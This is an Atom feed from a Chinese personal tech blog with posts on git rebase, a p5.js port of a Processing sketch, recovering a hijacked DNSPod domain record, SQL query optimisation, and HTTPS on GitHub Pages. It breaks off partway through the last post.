<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>SumyBlog</title>
  
  <subtitle>SumyGG的博客</subtitle>
  <link href="https://sumygg.com/atom.xml" rel="self"/>
  
  <link href="https://sumygg.com/"/>
  <updated>2021-03-16T08:51:03.056Z</updated>
  <id>https://sumygg.com/</id>
  
  <author>
    <name>Sumy</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>使用git中的rebase简化commit提交历史</title>
    <link href="https://sumygg.com/2018/10/28/simplify-commit-history-with-git-rebase/"/>
    <id>https://sumygg.com/2018/10/28/simplify-commit-history-with-git-rebase/</id>
    <published>2018-10-28T10:50:26.000Z</published>
    <updated>2021-03-16T08:51:03.056Z</updated>
    
    <content type="html"><![CDATA[<p>Git作为“现代”开发中不可获取的一部分，平时的最常用的几个命令是 <code>init</code> <code>clone</code> <code>push</code> <code>pull</code> <code>origin</code>。但Git包含的功能却远远不止这些。说起命令，就想起之前面试官提到了<code>rebase</code>，然后就尝试了一下<code>rebase</code>这个命令，最后发现这完全是强迫症的福利。只要平时的开发流里再多几个简单操作，世界就能变得很美好，而且有了IDE的加持，用起来更加简单便捷了。然后，虽然这个前言感觉很唐突，天道好轮回，技术债也是要还的。</p><h1 id="合并的策略"><a class="markdownIt-Anchor" href="#合并的策略"></a> 合并的策略</h1><p>合并从场景来说分为两种， <em>不同分支的合并</em> 和 <em>单个分支的合并</em> 。</p><p>不同分支的合并这个没什么可说的，参照 <code>git merge --no-ff xxx</code> 的命令执行。<br />而单个分支的合并一般在多人开发同一个分支的时候，如果有人提前提交到了远程仓库，那么其它人再想提交的话，就必须先把远程仓库的修改合并到本地，才能再次提交。</p><p>同事们大多数都是commit后发现提交不上去，然后pull一下执行一次同分支合并。这样提交记录里就会华丽丽的看到很多分支自己merge自己的情况了，而这种提交记录是完全没有必要的。（忽略黑黑的打码）</p><img src="/2018/10/28/simplify-commit-history-with-git-rebase/1.png" class="" title="包含很多的Merge"><p>marge 特点：自动创建一个新的commit<br />如果合并的时候遇到冲突，仅需要修改后重新commit<br />优点：记录了真实的commit情况，包括每个分支的详情<br />缺点：因为每次merge会自动产生一个merge commit，所以在使用一些git的GUI tools，特别是commit比较频繁时，看到分支很杂乱。</p><p>rebase 特点：会合并之前的commit历史<br />优点：得到更简洁的项目历史，去掉了merge commit<br />缺点：如果合并出现代码问题不容易定位，因为re-write了history</p><p><strong>单分支</strong> 下，建议使用rebase将远程分支更新到本地。 <strong>多分支</strong> 合并，使用merge策略合并分支。</p><h1 id="rebase使用"><a class="markdownIt-Anchor" href="#rebase使用"></a> rebase使用</h1><p>rebase的其它用法就不再介绍了（其实是暂时用不上，等用上了再说），只说明一下pull的时候的用法。</p><p>有人可能会说，那我在commit之前先pull一下，这样不就可以了？</p><p>这种方法完全可以，“事前”可以用来规避单分支合并出现无用commit的问题，但是不小心到“事后”了会怎样。</p><p>rebase使用起来非常简单，命令行模式下记得在pull的后加 <code>--rebase</code> 参数。常用命令如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">git pull --rebase     # 以rebase方式拉取代码</span><br><span class="line"></span><br><span class="line"># 遇到冲突时</span><br><span class="line">git rebase --continue # 遇到冲突，解决冲突后执行，继续rebase剩余代码</span><br><span class="line">git rebase --skip     # 忽略冲突的commit，继续rebase剩余代码</span><br><span class="line">git rebase --abort    # 终止rebase，回到rebase执行前状态</span><br></pre></td></tr></table></figure><p>GUI以Intellij为例</p><p>提交代码前先更新项目，使用rebase方式</p><img src="/2018/10/28/simplify-commit-history-with-git-rebase/2.png" class="" title="更新项目"><p>遇到冲突时解决冲突，IDE会自动执行 --continue 命令。</p><img src="/2018/10/28/simplify-commit-history-with-git-rebase/3.png" class="" title="解决冲突"><p>与平时使用的merge真的很像。</p><h1 id="总结一下"><a class="markdownIt-Anchor" href="#总结一下"></a> 总结一下</h1><p>rebase的一些用法：</p><ol><li>合并多个commit为一个完整的commit</li><li>将某一段commit粘贴到另一个分支上</li></ol><p>rebase实质是丢弃一些现有的提交，然后相应地新建一些内容一样但实际上不同的提交。</p><p><strong>rebase会改写历史记录，永远不要在已经push了的commit上使用。</strong></p><p>还是稍微吐槽一下 <em>变基</em> 这个名词吧，感觉很magic<img class="emoji" draggable="false" alt="⭐" src="https://twemoji.maxcdn.com/2/72x72/2b50.png"/>️</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;Git作为“现代”开发中不可获取的一部分，平时的最常用的几个命令是 &lt;code&gt;init&lt;/code&gt; &lt;code&gt;clone&lt;/code&gt; &lt;code&gt;push&lt;/code&gt; &lt;code&gt;pull&lt;/code&gt; &lt;code&gt;origin&lt;/code&gt;。但Git包含的功能却</summary>
      
    
    
    
    <category term="高效生活" scheme="https://sumygg.com/categories/%E9%AB%98%E6%95%88%E7%94%9F%E6%B4%BB/"/>
    
    
    <category term="git" scheme="https://sumygg.com/tags/git/"/>
    
    <category term="git rebase" scheme="https://sumygg.com/tags/git-rebase/"/>
    
  </entry>
  
  <entry>
    <title>魔法の筆 呪文で絵描くよ 君も描こう！</title>
    <link href="https://sumygg.com/2018/07/31/p5js-version-for-taiko-drum-master-song-void-setup/"/>
    <id>https://sumygg.com/2018/07/31/p5js-version-for-taiko-drum-master-song-void-setup/</id>
    <published>2018-07-31T05:48:45.000Z</published>
    <updated>2021-03-16T08:51:03.055Z</updated>
    
    <content type="html"><![CDATA[<p>好久没更新博客了，今天趁着月末就再来水一篇吧。</p><h1 id="起因原来是太鼓达人"><a class="markdownIt-Anchor" href="#起因原来是太鼓达人"></a> 起因原来是太鼓达人</h1><p>前十几天刷微博的时候发现一个有意思的歌曲，就是歌曲的歌词其实是一个程序，有人还把这首歌的歌词听写出来，然后跑起来了。</p><iframe src="https://www.youtube.com/embed/RuA9ZwIW7Mg" width="560" height="315" frameborder="0" loading="lazy" allowfullscreen></iframe><p>听完魔性的音乐后，一颗搞事的心在熊熊燃烧，就把这段代码抄了下来。。。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">setup</span><span class="params">()</span></span>&#123;</span><br><span class="line">  size(<span class="number">400</span>,<span class="number">400</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">float</span> a = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">draw</span><span class="params">()</span></span>&#123;</span><br><span class="line">  fill (#<span class="number">021050</span>,<span class="number">5</span>);</span><br><span class="line">  rect (<span class="number">0</span>,<span class="number">0</span>,width,height);</span><br><span class="line">  translate (<span class="number">200</span>+a*<span class="number">10</span>,<span class="number">200</span>+a*<span class="number">10</span>);</span><br><span class="line">  rotate (a);</span><br><span class="line">  scale (a/<span class="number">15</span>);</span><br><span class="line">  a+= <span class="number">0.05</span>;</span><br><span class="line">  kao (<span class="number">0</span>,<span class="number">-50</span>);</span><br><span class="line">  kao (<span class="number">1</span>,<span class="number">50</span>);</span><br><span class="line">  <span class="keyword">if</span> (a&gt;<span class="number">30</span>) a-= <span class="number">50</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//魔法の筆 呪文で絵描くよ 君も描こう！</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">kao</span> <span class="params">(<span class="keyword">int</span> don,<span class="keyword">float</span> b)</span></span>&#123;</span><br><span class="line">  stroke (<span class="number">0</span>);</span><br><span class="line">  strokeWeight (<span class="number">2</span>);</span><br><span class="line">  fill (#e7eedd);</span><br><span class="line">  ellipse (b,<span class="number">0</span>,<span class="number">50</span>,<span class="number">50</span>);</span><br><span class="line">  noStroke ();</span><br><span class="line">  fill (#<span class="number">68</span>c0c0 + #<span class="number">8f</span>8768 * don);</span><br><span class="line">  ellipse (b,<span class="number">0</span>,<span class="number">38</span>,<span class="number">38</span>);</span><br><span class="line"></span><br><span class="line">  stroke (<span class="number">0</span>);</span><br><span class="line">  strokeWeight (<span class="number">1.4</span>);</span><br><span class="line">  arc (b + <span class="number">4.26</span>,<span class="number">5</span>,<span class="number">8.5</span>,<span class="number">7.3</span>,<span class="number">0.3</span>,PI,OPEN);</span><br><span class="line">  arc (b - <span class="number">4.26</span>,<span class="number">5</span>,<span class="number">8.5</span>,<span class="number">7.3</span>,<span class="number">0</span>,PI<span class="number">-0.3</span>,OPEN);</span><br><span class="line"></span><br><span class="line">  fill (<span class="number">0</span>);</span><br><span class="line">  ellipse (b<span class="number">-11</span>,<span class="number">-2</span>,<span class="number">6.56</span>,<span class="number">7</span>);</span><br><span class="line">  ellipse (b+<span class="number">11</span>,<span class="number">-2</span>,<span class="number">6.56</span>,<span class="number">7</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//世界が始まるよーーー</span></span><br></pre></td></tr></table></figure><h1 id="void_setup的即兴转换"><a class="markdownIt-Anchor" href="#void_setup的即兴转换"></a> void_setup的即兴转换</h1><p>查了一下这段代码所用的语言，使用的是一个叫<a href="https://processing.org/">Processing</a>的语言。好巧的是前段时间又正好了解了这个语言的 JavaScript 实现版 <a href="https://p5js.org/">p5.js</a>。能不能将上面的语言实现成下面的这种呢？</p><p>在一个周末，借助文档、搜索引擎和零食，成功的完成了代码的转换工作。由于是同一种语言的不同实现，代码的相似度还是挺高的。这段代码可以在 jsfiddle 中直接运行。</p><iframe scrolling="no" width="100%" height="500px" src="https://jsfiddle.net/89um5a6j/embedded/js,result/light" frameborder="0" loading="lazy" allowfullscreen></iframe><h1 id="魔法的画笔你也一起来画吧"><a class="markdownIt-Anchor" href="#魔法的画笔你也一起来画吧"></a> 魔法的画笔，你也一起来画吧</h1><p>在转换的过程中，遇到了一些“不太兼容”的问题。</p><p>在网页上需要转换成Canvas画布，于是 <code>size()</code> 命令就转成了 <code>createCanvas()</code> 命令。</p><p>Processing中的颜色可以直接作为常亮使用，而JavaScript中的颜色使用字符串的形式表示，不同的写法代表不同的意义。如 <code>rgba()</code> 是颜色附带了透明度的形式。</p><p>颜色还有一个不同的地方是JavaScript的颜色不能直接相加。在Processing中小红的颜色是根据小蓝的颜色 <code>#68c0c0</code> 加上 <code>#8f8768</code> 得到的，这里直接使用了计算后的小红的颜色值 <code>#fb4828</code> 。颜色相加就是普通的二进制相加。</p><p>绘制的算法主要分为两个步骤，第一步是进行画布变换，对画布进行位移、旋转、缩放的变换。第二步则是在变换后的画布上绘制两个图像，图像的绘制由 <code>kao()</code> 函数完成。</p><img src="/2018/07/31/p5js-version-for-taiko-drum-master-song-void-setup/canvas_draw.png" class="" title="画一画"><p>一个很简单的绘图小程序就这样出现了（再次。</p><h1 id="最后才开始吧"><a class="markdownIt-Anchor" href="#最后才开始吧"></a> 最后才开始吧</h1><p>对了，忘了说这首歌叫《void setup》，可惜的是网易云音乐还没有收录该音乐。不过自己已经从油管上下载了音频文件，有空的时候可以慢慢回味一下。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;好久没更新博客了，今天趁着月末就再来水一篇吧。&lt;/p&gt;
&lt;h1 id=&quot;起因原来是太鼓达人&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#起因原来是太鼓达人&quot;&gt;&lt;/a&gt; 起因原来是太鼓达人&lt;/h1&gt;
&lt;p&gt;前十几天刷微博的时候发现一个有意思的歌曲</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>记一次简单的域名解析找回操作</title>
    <link href="https://sumygg.com/2018/06/26/domain-resolves-to-an-unknown-website/"/>
    <id>https://sumygg.com/2018/06/26/domain-resolves-to-an-unknown-website/</id>
    <published>2018-06-26T14:38:55.000Z</published>
    <updated>2021-03-16T08:51:03.054Z</updated>
    
    <content type="html"><![CDATA[<p>前段时间搞了点东西，想放到自己的域名上。很自然的在域名解析里配置了将域名解析到自己服务器上，结果过了一段时间发现，域名被解析到一个**彩网站上面去了。以为自己搞错了解析，再三确认了配置没有错误。然后开始了解析错误查找之旅。</p><p>首先确认了解析有没有过来，使用了<a href="http://ping.chinaz.com">站长工具Ping检测</a>测试了域名的连通情况，发现国内的解析都指向了一个IP地址，国外的解析都是正常的。而直接访问这个IP地址，就是那个什么什么的网站。</p><p>国内国外出现了不同的解析地址，下一步用 <code>dig</code> 命令看一下域名的dns情况：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">sumy@DESKTOP-14HIGI1:&#x2F;mnt&#x2F;c&#x2F;Users&#x2F;sumy$ dig sumygg.com</span><br><span class="line"></span><br><span class="line">; &lt;&lt;&gt;&gt; DiG 9.11.3-1ubuntu1-Ubuntu &lt;&lt;&gt;&gt; sumygg.com</span><br><span class="line">;; global options: +cmd</span><br><span class="line">;; Got answer:</span><br><span class="line">;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 7830</span><br><span class="line">;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 2, ADDITIONAL: 11</span><br><span class="line"></span><br><span class="line">;; OPT PSEUDOSECTION:</span><br><span class="line">; EDNS: version: 0, flags:; udp: 4096</span><br><span class="line">;; QUESTION SECTION:</span><br><span class="line">;sumygg.com.                    IN      A</span><br><span class="line"></span><br><span class="line">;; ANSWER SECTION:</span><br><span class="line">sumygg.com.             600     IN      A       45.114.10.107</span><br><span class="line"></span><br><span class="line">;; AUTHORITY SECTION:</span><br><span class="line">sumygg.com.             86202   IN      NS      f1g1ns2.dnspod.net.</span><br><span class="line">sumygg.com.             86202   IN      NS      f1g1ns1.dnspod.net.</span><br><span class="line"></span><br><span class="line">;; ADDITIONAL SECTION:</span><br><span class="line">f1g1ns1.dnspod.net.     166658  IN      A       182.140.167.166</span><br><span class="line">f1g1ns1.dnspod.net.     166658  IN      A       14.215.150.17</span><br><span class="line">f1g1ns1.dnspod.net.     166658  IN      A       58.247.212.36</span><br><span class="line">f1g1ns1.dnspod.net.     166658  IN      A       61.151.180.44</span><br><span class="line">f1g1ns1.dnspod.net.     166658  IN      A       180.163.19.15</span><br><span class="line">f1g1ns2.dnspod.net.     166657  IN      A       61.129.8.159</span><br><span class="line">f1g1ns2.dnspod.net.     166657  IN      A       101.226.220.16</span><br><span class="line">f1g1ns2.dnspod.net.     166657  IN      A       121.51.128.164</span><br><span class="line">f1g1ns2.dnspod.net.     166657  IN      A       182.140.167.188</span><br><span class="line">f1g1ns2.dnspod.net.     166657  IN      A       52.220.136.67</span><br><span class="line"></span><br><span class="line">;; Query time: 46 msec</span><br><span class="line">;; SERVER: 192.168.1.1#53(192.168.1.1)</span><br><span class="line">;; WHEN: Sun Jun 17 00:41:30 DST 2018</span><br><span class="line">;; MSG SIZE  rcvd: 269</span><br></pre></td></tr></table></figure><p>可以发现解析被dnspod接管了，但是我之前并没有在上面配置相关的dns解析？不管怎样还是登陆上去看一看。</p><p>dnspod与域名解析的网站很相似，关键是可以 <strong>自定义</strong> 输入域名，即使那个域名不是dnspod所有。我试着输入了我的域名，提示域名已经被其它账户占用了，是否需要认领。</p><img src="/2018/06/26/domain-resolves-to-an-unknown-website/1.png" class="" title="域名认领提示"><p>认领域名需要认证 <strong>WHOIS</strong> 邮箱，还好之前已经在域名里配置了相关的邮箱，通过WHOIS成功将域名取回到了自己的账户里。</p><p>认领回来第一步就是把错误的域名解析删除，然后 <em>不情愿</em> 的换上了自己的域名解析。</p><p>查看了域名操作记录，发现它在几天前就已经恶意注册了域名解析，过了几天才被我发现。</p><img src="/2018/06/26/domain-resolves-to-an-unknown-website/2.png" class="" title="域名操作记录"><p>限于自己的水平，就没对这个邮箱做进一步处理，域名解析找回来了，可喜可贺，可喜可贺。</p><p>回想这件事，dnspod这种先来先得的域名认领方式存在很大的隐患，还不知道有多少人的域名被恶意认领。规则之下，无至则溃。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;前段时间搞了点东西，想放到自己的域名上。很自然的在域名解析里配置了将域名解析到自己服务器上，结果过了一段时间发现，域名被解析到一个**彩网站上面去了。以为自己搞错了解析，再三确认了配置没有错误。然后开始了解析错误查找之旅。&lt;/p&gt;
&lt;p&gt;首先确认了解析有没有过来，使用了&lt;a</summary>
      
    
    
    
    <category term="网站" scheme="https://sumygg.com/categories/%E7%BD%91%E7%AB%99/"/>
    
    
    <category term="域名" scheme="https://sumygg.com/tags/%E5%9F%9F%E5%90%8D/"/>
    
    <category term="解析" scheme="https://sumygg.com/tags/%E8%A7%A3%E6%9E%90/"/>
    
    <category term="dnspod" scheme="https://sumygg.com/tags/dnspod/"/>
    
  </entry>
  
  <entry>
    <title>优化SQL查询时候的性能</title>
    <link href="https://sumygg.com/2018/05/31/optimize-sql-queries-to-improving-the-performance/"/>
    <id>https://sumygg.com/2018/05/31/optimize-sql-queries-to-improving-the-performance/</id>
    <published>2018-05-31T13:43:49.000Z</published>
    <updated>2021-03-16T08:51:03.054Z</updated>
    
    <content type="html"><![CDATA[<p>最近是特殊时期，都在强调系统性能的优化。在师傅的指导下，对系统中一个比较费劲的功能进行了优化。师傅的理念是： <strong>能用SQL解决的问题绝不用程序处理</strong> 。在实际场景下，通过优化，将3分钟无法完成的业务优化到了1分钟以内。虽然没有优化到极致，但对SQL查询性能的了解前进了一大步，于是稍微记录一下。</p><h1 id="建立索引"><a class="markdownIt-Anchor" href="#建立索引"></a> 建立索引</h1><p>索引是避免全表扫描的一个重要手段。有索引和没有索引，好的索引和差的索引，对于性能的影响都是不同的。对于经常查询的字段可以建立索引，如主键；对于经常组合查询的字段可以建立联合索引。</p><p>这次遇到的情况是：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> table1 <span class="keyword">where</span> a<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> b <span class="keyword">in</span> (?, ?);</span><br></pre></td></tr></table></figure><p>这样子可以考虑将 <code>(a, b)</code> 建立组合索引。</p><h1 id="使用in进行批量查询"><a class="markdownIt-Anchor" href="#使用in进行批量查询"></a> 使用IN进行批量查询</h1><p>一般情况下，通过一次查询之后可能不会完全返回需要的所有数据，这时候会对每一条数据进行一次补充查询。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 返回初始数据</span></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> table1 <span class="keyword">where</span> deleted <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 对初始数据补充查询数据</span></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> table2 <span class="keyword">where</span> id <span class="operator">=</span> ? <span class="keyword">and</span> deleted <span class="operator">=</span> <span class="number">0</span>;</span><br></pre></td></tr></table></figure><p>如果数据条目比较多，会频繁进行访问数据库操作。</p><p>为了减轻数据库的压力，可以将第一次查询初始数据后的值整合到列表中，查询补充数据的时候通过 <strong>IN</strong> 操作一次全部查询出来，然后在内存中转成map与初始数据对应结合。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> table2 <span class="keyword">where</span> deleted <span class="operator">=</span> <span class="number">0</span> <span class="keyword">and</span> id <span class="keyword">IN</span> (?, ?, ?);</span><br></pre></td></tr></table></figure><h1 id="避免将不同字段作为条件进行or查询"><a class="markdownIt-Anchor" href="#避免将不同字段作为条件进行or查询"></a> 避免将不同字段作为条件进行OR查询</h1><p>使用 <strong>OR</strong> 可以查询出满足多个条件中至少一个条件的数据。但是如果遇到没有索引的字段，可能会造成无用的全表扫描。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> table1 <span class="keyword">where</span> deleted <span class="operator">=</span> <span class="number">0</span> <span class="keyword">and</span> ( a <span class="operator">=</span> ? <span class="keyword">OR</span> b <span class="operator">=</span> ?);</span><br></pre></td></tr></table></figure><p>这种情况下通过将OR进行拆分，作为两个select语句，通过 <strong>UNION ALL</strong> 的方式结合数据。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> table1 <span class="keyword">where</span> deleted <span class="operator">=</span> <span class="number">0</span> <span class="keyword">and</span> a <span class="operator">=</span> ?</span><br><span class="line"><span class="keyword">UNION</span> <span class="keyword">ALL</span></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> table1 <span class="keyword">where</span> deleted <span class="operator">=</span> <span class="number">0</span> <span class="keyword">and</span> b <span class="operator">=</span> ?</span><br></pre></td></tr></table></figure><p>这样使得两个SQL可以分别根据自己的条件进行优化，避免全表扫描的出现。</p><h1 id="避免进行大量的join操作"><a class="markdownIt-Anchor" href="#避免进行大量的join操作"></a> 避免进行大量的JOIN操作</h1><p>大多数情况下，需要的数据会存在两个或多个表中。使用 <strong>JOIN</strong> 可以很方便的将多个表中需要的字段数据聚合起来。但是如果JOIN的表过多，数据库引擎会先将各个表根据JOIN条件聚合成一个宽表，然后从中查询。JOIN后表记录数是乘积式的增长。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> t1.<span class="operator">*</span> <span class="keyword">from</span> table1 t1</span><br><span class="line">  <span class="keyword">LEFT</span> <span class="keyword">JOIN</span> table2 t2 <span class="keyword">ON</span> t1.id<span class="operator">=</span>t2.t1_id</span><br><span class="line">  <span class="keyword">LEFT</span> <span class="keyword">JOIN</span> table3 t3 <span class="keyword">ON</span> t1.id<span class="operator">=</span>t3.t1_id</span><br><span class="line">  <span class="keyword">LEFT</span> <span class="keyword">JOIN</span> table4 t4 <span class="keyword">ON</span> t1.id<span class="operator">=</span>t4.t1_id</span><br><span class="line"><span class="keyword">where</span></span><br><span class="line">  t1.delted <span class="operator">=</span> <span class="number">0</span>;</span><br></pre></td></tr></table></figure><p>JOIN的表不易过多，1-2张为易，最近看到一张JOIN了5张表的查询，这样做的原因是想在SQL中查询其它表中的字段的聚合数据。这个时候可以考虑使用子查询进行改写：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> t1.<span class="operator">*</span></span><br><span class="line">    (<span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">from</span> table2 t2 <span class="keyword">where</span> t2.t1_id<span class="operator">=</span>t1.id) t2_count,</span><br><span class="line">    (<span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">from</span> table3 t3 <span class="keyword">where</span> t3.t1_id<span class="operator">=</span>t1.id) t3_count,</span><br><span class="line">    (<span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">from</span> table4 t4 <span class="keyword">where</span> t4.t1_id<span class="operator">=</span>t1.id) t4_count,</span><br><span class="line"> <span class="keyword">from</span> table1 t1</span><br><span class="line"> <span class="keyword">where</span></span><br><span class="line">   t1.deleted <span class="operator">=</span> <span class="number">0</span>;</span><br></pre></td></tr></table></figure><p>如果实在需要其它表的一些字段数据，可以参考前面提到的 <strong>批量查询</strong> 的方法，先是几张表进行关联查出基础数据，然后其它表关联查询附加数据，最后在内存中对这些数据进行整合。</p><p>如果这样关联的表还是很多，说明数据库设计有问题。</p><h1 id="总结"><a class="markdownIt-Anchor" href="#总结"></a> 总结</h1><p>拜拜。<img class="emoji" draggable="false" alt="✋" src="https://twemoji.maxcdn.com/2/72x72/270b.png"/></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;最近是特殊时期，都在强调系统性能的优化。在师傅的指导下，对系统中一个比较费劲的功能进行了优化。师傅的理念是： &lt;strong&gt;能用SQL解决的问题绝不用程序处理&lt;/strong&gt; 。在实际场景下，通过优化，将3分钟无法完成的业务优化到了1分钟以内。虽然没有优化到极致，但对S</summary>
      
    
    
    
    <category term="实践" scheme="https://sumygg.com/categories/%E5%AE%9E%E8%B7%B5/"/>
    
    
    <category term="mysql" scheme="https://sumygg.com/tags/mysql/"/>
    
    <category term="sql" scheme="https://sumygg.com/tags/sql/"/>
    
    <category term="优化" scheme="https://sumygg.com/tags/%E4%BC%98%E5%8C%96/"/>
    
    <category term="数据库" scheme="https://sumygg.com/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/"/>
    
  </entry>
  
  <entry>
    <title>自定义域名在Github Pages中支持通过HTTPS访问</title>
    <link href="https://sumygg.com/2018/05/28/custom-domains-on-github-pages-support-for-https/"/>
    <id>https://sumygg.com/2018/05/28/custom-domains-on-github-pages-support-for-https/</id>
    <published>2018-05-28T13:43:23.000Z</published>
    <updated>2021-03-16T08:51:03.053Z</updated>
    
    <content type="html"><![CDATA[<p>最近<a href="https://blog.github.com/2018-05-01-github-pages-custom-domains-https/">Github官方博客</a>上已经宣布自定义域名也支持通过HTTPS进行访问。之前也没想过要弄个HTTPS，借着这个机会就搞一搞HTTPS访问吧。不过都现在了，已经过了尝鲜期了。</p><h1 id="更新域名解析地址"><a class="markdownIt-Anchor" href="#更新域名解析地址"></a> 更新域名解析地址</h1><p>之前已经将域名访问指向了 <code>192.30.252.153</code> 和 <code>192.30.252.154</code>，这次要使用最新的HTTPS需要将域名记录指向新的IP地址，官方给出了四组IP地址：</p><blockquote><p>185.199.108.153<br />185.199.109.153<br />185.199.110.153<br />185.199.111.153</p></blockquote><p>我用了顶级域名当做博客的域名，将顶级域名的A记录全部接卸到了以上四个IP地址上。解析规则如下：</p><img src="/2018/05/28/custom-domains-on-github-pages-support-for-https/1.png" class="" title="DNS解析配置"><p>Github上给出了很详细的说明，可以参考一下<a href="https://help.github.com/articles/using-a-custom-domain-with-github-pages/">如何自定义域名</a>。</p><h1 id="启用https域名跳转"><a class="markdownIt-Anchor" href="#启用https域名跳转"></a> 启用HTTPS域名跳转</h1><p>修改域名解析之后根据解析时间的长短，需要几个小时到1天不等的时间来同步DNS解析。这个时候可以去设置里看一看能不能行。</p><p>在Github上，打开你存放博客的那个仓库，选择 <strong>Settings</strong>，在 “GitHub Pages” 下如果可以选中 <strong>Enforce HTTPS</strong> ，那么恭喜你已经开启HTTPS解析了。</p><p>但大多数情况还是会出现 <strong>Unavailable for your site because your domain is not properly configured to support HTTPS</strong> 的提示：</p><img src="/2018/05/28/custom-domains-on-github-pages-support-for-https/2.png" class="" title="GitHub Pages配置"><p>这个时候需要先清空 <strong>Custom Domain</strong> 里的设置，保存后重新填入域名，触发一下Github生成页面的机制。如果这时候看到 <strong>Not yet available for your site because the certificate has not finished being issued</strong> 的提示，说明再等一段时间，等Github为你的域名签发证书就选中了。</p><p>我在这个过程中遇到了一些问题，修改了DNS解析，删除并添加域名好多次都无法成功生成证书。后来发现之前在DNSPod设置了域名解析，于是把上面的解析删除掉。过了一天左右，通过在线DNS解析测试，发现所有的域名都已经解析到正确的IP地址上：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td 